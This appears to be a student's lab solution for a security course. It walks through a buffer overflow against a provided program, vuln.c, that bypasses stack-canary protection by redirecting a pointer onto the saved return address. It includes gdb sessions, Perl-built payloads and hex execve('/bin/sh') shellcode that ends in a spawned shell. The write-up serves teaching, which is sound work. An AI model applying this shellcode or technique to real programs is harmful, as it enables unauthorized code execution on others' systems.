# Solutions TP6

## 6.2 Evading Stack Protection
> In "vuln.c" is a program that has a vulnerability even when compiled with stack protection. This file can be built with: `gcc -z execstack -o vuln vuln.c`, optionally you can also include debugging information with "-g".
> 
> NOTE: we do compile with stack protection! The goal of this part of the tutorial is for you to exploit code with stack protection enabled!
> 
> We can run this program with: `./vuln AAAA BBBB` and see that we are shown some memory addresses (these are included to help you).
> 
> By examining the code we can see that there is an instance of strcpy that we can probably exploit.
> 
> The goal is to provide command line arguments that allow you to execute a shellcode (of your choice, but a simple /bin/sh one is fine including taking one from an earlier tutorial).
> 
> HINT: Use the first strcpy to overflow and change the value of where "p" points to.

### Idea :bulb:
We can see that in function *f*, an unsfae call to *strcpy* is made, copying the whole string passed in `argv[1]` in a char array of size 30.  This is a good entry point for a buffer overflow.  
We can also see that we have a pointer, `p` (initially set equal to the pointer of the array), that we use as destination for our *strcpy*.  We can then overwrite the value of this pointer with the first argument (and first call to *strcpy*) by doing an overflow on the array, and then write our interesting command wherever we want with the second argument (and second call to *strncpy*).

### Step by step :walking:
**1. Overwriting p** This is quite simple, we have done it plenty of time before, we can simply run the program with a string of more than 30 caracters.
```console
$ ./vuln `perl -e 'print "\x90"x30 . "\x42"x4'` BBBB
p=bffff2fe       -- before 1st strcpy
p=42424242       -- after 1st  strcpy
Segmentation fault
```
Of course we get a *Segmentation fault* as we try to write to the address `0x42424242` with our second *strncpy*, which is probably not a writable one.

**2. Execl arguments**  The final goal will be to change the argument passed to *execl*, to give it a command that would open a shell (`/bin/sh`).  To do this, we need to know where is this argument stored in memory.  
> From here I am not very sure of what I'm doing, there might be better way of proceeding.  

First we need to know what we are looking for, in memory the initial first argument won't be presented in convenient ascii characters but in heaxadecimal values, so let's check what those values would be (you can use any online coverter for this):
```
back_to_vul --> 62 61 63 6b 5f 74 6f 5f 76 75 6c 0d 0a
```
In gdb, we can run the file one time to fix the addresses, then disass the main function.
```console
$ (gdb) run aaa bbb
Starting program: /home/admin/SecurityClass/Tutorial-06/6.2/vuln aaa bbb
...
$ (gdb) disass main
Dump of assembler code for function main:
   ...
   0x00401290 <+45>:    push   $0x0
   0x00401292 <+47>:    lea    -0x1fa9(%ebx),%eax
   0x00401298 <+53>:    push   %eax
   0x00401299 <+54>:    lea    -0x1fa8(%ebx),%eax
   0x0040129f <+60>:    push   %eax
   0x004012a0 <+61>:    call   0x401080 <execl@plt>
   ...    
End of assembler dump.
```
We can see here the three arguments of *execl* being pushed to the stack before the call of the function, the last one being the first argument of the function (the one we have interest in).  To see what is the value pushed on the stack, we can add a breakpoint just after this last push, and see what is the value of `eax` at this moment.  By printing the content of the memory at this address, we should then find the string "back_to_vul" (in hexadecimal of course).
```console
$ (gdb) b *0x40129f
Breakpoint 1 at 0x40129f: file vuln.c, line 23.
$ (gdb) run aaa bbb
Starting program: /home/admin/SecurityClass/Tutorial-06/6.2/vuln aaa bbb
...
Breakpoint 1, 0x0040129f in main ()
$ (gdb) i r $eax
eax            0x402058            4202584
$ (gdb) x/4xw 0x402058
0x402058:       0x6b636162      0x5f6f745f      0x006c7576      0x20646e45
```
We found the address (`0x00402058`) of the string to overwrite!

**3. Overwriting execl argument**
This is where I'm stuck, the address we make our second *strncpy* write to isn't writable, so we get a SIGSEGV.  In theory we would need to simply do this:
```console
$ (gdb) run "`perl -e 'print "\x90"x30 . "\x58\x20\x40"'`" /bin/sh
Starting program: /home/admin/SecurityClass/Tutorial-06/6.2/vuln "`perl -e 'print "\x90"x30 . "\x58\x20\x40"'`" /bin/sh
p=bffff28e       -- before 1st strcpy
p=402058         -- after 1st  strcpy

Program received signal SIGSEGV, Segmentation fault.
```

### New idea :bulb: :bulb:
It seems like we can not edit the part of the memory where our "back_to_vul" is writtenn, we then need another strategy.  We know that the stack is protected by a canary, this means that we cannot do a simple buffer overflow containing shellcode as we did before.  The new idea is the following:

 - Overwrite the value of the pointer `p` so that it points to register `$eip`.
 - Overwrite the value stored in `$eip` to change the return value.
 - Make that return value point to a third argument we passed to our program, which contains our magical shellcode.
 
### Step by step :walking:
**1. Arguments** Here we are going to play with the stack of the program itself, needing to access its arguments.  This means that if we change the size of the elements we pass to the program, our stack will be modified, and the address we need to access its content too.  Therefore, I will start by giving my program all the arguments it will needs (at least the right number), and only modify the values passed themself later on.  
 - Our first argument will be very similar to what we did before, 30 characters and and address: `perl -e 'print "\x90"x30 . "\x42"x4'`.  
 - The second argument is simply an address: `perl -e 'print "\x90"x30 . "\x60\x61\x62\x63"'`.  
 - The shellcode we are goind to use is the same as in the previous practical session, it can be generated and passed to the program this way: `perl -e 'print "\x90"x21 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"'`.  This our third argument.

**2. Finding $eip location in stack**  The address we want our first argument to write in `p` is the one of the return address of the function *f*.  To check find it I first checked what was the next instruction after the call to *f* in the *main* usin disass.  Then I looked up in the stack at which address is this value stored, this is the value I will need to pass in my first argument.
```console
$ (gdb) disass main
Dump of assembler code for function main:
   ...
   0x00401285 <+34>:    call   0x4011d9 <f>
   0x0040128a <+39>:    add    $0x10,%esp
   ...
End of assembler dump.
$ (gdb) b *0x401285
Breakpoint 1 at 0x401285
$ (gdb) run `perl -e 'print "\x40"x30 . "\x42"x4 . " " . "\x60\x61\x62\x63" . " " . "\x90"x21 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"'`

Breakpoint 1, 0x00401285 in main ()
$ (gdb) disass f
Dump of assembler code for function f:
   ...
   0x004011fe <+37>:    call   0x401030 <printf@plt>
   ...
   0x00401215 <+60>:    call   0x401040 <strcpy@plt>
   ...
   0x0040122a <+81>:    call   0x401030 <printf@plt>
   ...
   0x00401243 <+106>:   call   0x401070 <strncpy@plt>
   ...
   0x00401261 <+136>:   leave  
   0x00401262 <+137>:   ret  
End of assembler dump.
$ (gdb) b *0x401215
Breakpoint 2 at 0x401215
$ (gdb) c
Continuing.
p=bffff24e       -- before 1st strcpy

Breakpoint 2, 0x00401215 in f ()
$ (gdb) x/24xw 0xbffff24e
0xbffff24e:     0x40404040      0x40404040      0x40404040      0x40404040
0xbffff25e:     0x40404040      0x40404040      0x40404040      0xf27c4040
0xbffff26e:     0x8300bfff      0x4000b7fb      0xf2980040      0xf530bfff
0xbffff27e:     0x0000bfff      0x00000000      0x00000000      0x12770000
0xbffff28e:     0xf2b00040      0x0000bfff      0x00000000      0xf7e10000
0xbffff29e:     0x8000b7df      0x8000b7fb      0x0000b7fb      0xf7e10000
$ (gdb) x/xw 0xbffff27c
0xbffff27c:     0x0040128a
```
We got our address, `0xbffff27c`.

**3. Finding arguments address** To find the arguments address, you can either print some memory blocks randomly and hope to recognize your code...  or you recompile the executable with debugging informations and you directly check the value of `argv[3]`.  For me it was in the neighbourhood of `0xbffff500`.
```console
$ (gdb) x/80xw 0xbffff51b
0xbffff51b:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff52b:     0x90909090      0xb0c03190      0x31db3146      0xeb80cdc9
0xbffff53b:     0xc0315b16      0x89074388      0x4389085b      0x8d0bb00c
0xbffff54b:     0x538d084b      0xe880cd0c      0xffffffe5      0x6e69622f
0xbffff55b:     0x4e68732f      0x41414141      0x42424242      0x45485300
0xbffff56b:     0x2f3d4c4c      0x2f6e6962      0x68736162      0x53455300
0xbffff57b:     0x4e4f4953      0x4e414d5f      0x52454741      0x636f6c3d
0xbffff58b:     0x6b2f6c61      0x3a696c61      0x6d742f40      0x492e2f70
0xbffff59b:     0x752d4543      0x2f78696e      0x2c323537      0x78696e75
0xbffff5ab:     0x6c616b2f      0x742f3a69      0x2e2f706d      0x2d454349
0xbffff5bb:     0x78696e75      0x3235372f      0x4e495700      0x49574f44
0xbffff5cb:     0x00303d44      0x415f5451      0x53454343      0x49424953
0xbffff5db:     0x5954494c      0x5800313d      0x435f4744      0x49464e4f
0xbffff5eb:     0x49445f47      0x2f3d5352      0x2f637465      0x00676478
0xbffff5fb:     0x5f474458      0x53534553      0x5f4e4f49      0x48544150
0xbffff60b:     0x726f2f3d      0x72662f67      0x65646565      0x6f746b73
0xbffff61b:     0x69442f70      0x616c7073      0x6e614d79      0x72656761
0xbffff62b:     0x7365532f      0x6e6f6973      0x44580030      0x454d5f47
0xbffff63b:     0x505f554e      0x49464552      0x66783d58      0x002d6563
0xbffff64b:     0x474e414c      0x45474155      0x5353003d      0x55415f48
```

### Final solution :running:
Then we have all we need, we just have to put it all together.  The only issue remaining is that I was only able to launch the shellcode in gdb, and the shell get launched in background by gdb.  Their is a way to force gdb to follow the fork created by the programm we run (`set allow-fork-mode child`).
```console
$ (gdb) set allow-fork-mode child
$ (gdb) run `perl -e 'print "\x40"x30 . "\x7c\xf2\xff\xbf" . " " . "\x30\xf5\xff\xbf" . " " . "\x90"x21 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"'`
Starting program: /home/admin/SecurityClass/Tutorial-06/6.2/vuln `perl -e 'print "\x40"x30 . "\x7c\xf2\xff\xbf" . " " . "\x30\xf5\xff\xbf" . " " . "\x90"x21 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"'`
p=bffff24e       -- before 1st strcpy
p=bffff27c       -- after 1st  strcpy
After second strcpy ;)
process 1581 is executing new program: /usr/bin/dash
$ ls
[Detaching after fork from child process 1590]
vuln  vuln.c
$ 
[Inferior 1 (process 1581) exited normally]
```
This might not work for you as addresses might have changed.
